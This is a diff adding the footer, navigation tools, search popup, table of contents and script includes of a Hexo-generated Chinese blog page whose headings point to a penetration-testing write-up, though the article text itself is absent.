+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2024
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">redpomelo</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">14.4k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="nav-text">渗透过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F"><span class="nav-text">扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="nav-text">子域名爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="nav-text">目录爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="nav-text">进入后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
